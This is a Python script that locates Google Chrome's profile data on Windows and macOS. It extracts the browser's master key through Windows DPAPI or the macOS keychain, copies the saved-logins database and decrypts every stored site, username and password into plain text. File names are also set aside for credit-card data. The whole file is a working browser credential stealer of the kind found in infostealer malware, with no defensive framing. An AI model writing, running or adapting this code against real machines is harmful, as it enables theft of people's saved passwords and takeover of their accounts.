import os
import sys
import platform
import json
import base64
import shutil
import sqlite3
from Crypto.Cipher import AES
from Crypto.Protocol import KDF
try:
    import win32crypt
except:
    pass
import subprocess
from contextlib import closing

file0 = "chrome_passwords.txt"  # File to store Chrome plain passwords
# File to store Chrome plain credit cards information
file1 = "chrome_credit_cards.txt"
file2 = "chrome_login.db"  # File to store Chrome encrypted passwords
file3 = "chrome_credit_cards.db"  # File to store Chrome encrypted credit cards

OS = [
    {
        "Windows": {
            "Chrome": {
                "basepath": os.path.join(os.path.expanduser("~"), "AppData\\Local\\Google\\Chrome\\User Data"),
                "key_path": "Local State",
                "passwords_path": "Default\\Login Data",
                "credit_cards_path": "Default\\Web Data"
            },
        }
    },
    {
        "Darwin": {
            "Chrome": {
                "basepath": os.path.join(os.path.expanduser("~"), "Library/Application Support/Google/Chrome"),
                "passwords_path": "Default/Login Data"
            }
        }
    },
]


def get_secret_key():
    os_name = platform.system()

    if os_name == "Windows":
        system = OS[0]
        file = os.path.join(
            system[os_name]["Chrome"]["basepath"], system[os_name]["Chrome"]["key_path"])
        with open(file, "r", encoding="latin1") as f:
            secret_key = base64.b64decode(
                json.load(f)["os_crypt"]["encrypted_key"])[5:]
            secret_key = win32crypt.CryptUnprotectData(
                secret_key, None, None, None, 0)[1]

    elif os_name == "Darwin":
        try:
            system = OS[1]
            secret_key = subprocess.check_output(
                "security find-generic-password -wa 'Chrome'", shell=True).replace(b"\n", b"")
            secret_key = KDF.PBKDF2(secret_key, b"saltysalt", 16, 1003)
        except:
            sys.exit("The user didn't allow access to Chrome Storage Key!")

    else:
        sys.exit("Your OS is not supported!")
    return secret_key, system, os_name


def decrypt_passwords(secret_key, system, os_name):
    shutil.copy2(os.path.join(
        system[os_name]["Chrome"]["basepath"], system[os_name]["Chrome"]["passwords_path"]), file2)

    with closing(sqlite3.connect(file2)) as conn:
        with closing(conn.cursor()) as cursor:
            cursor.execute(
                "SELECT signon_realm, username_value, password_value FROM logins")
            decrypted_passwords = []

            for _, login in enumerate(cursor.fetchall()):
                if login:
                    decrypted_passwords.append(
                        {"Hostname": login[0], "Username": login[1], "Password": decrypt(secret_key, login[2], system)})

    return decrypted_passwords



def decrypt(secret_key, cipher_text, system):
    if list(system.keys())[0] == "Windows":
        initialization_vector = cipher_text[3:15]
        encrypted_password = cipher_text[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, initialization_vector)

    elif list(system.keys())[0] == "Darwin":
        initialization_vector = b" " * 16
        encrypted_password = cipher_text[3:]
        cipher = AES.new(secret_key, AES.MODE_CBC, initialization_vector)

    decrypted_password = cipher.decrypt(encrypted_password).decode("latin1")
    return decrypted_password

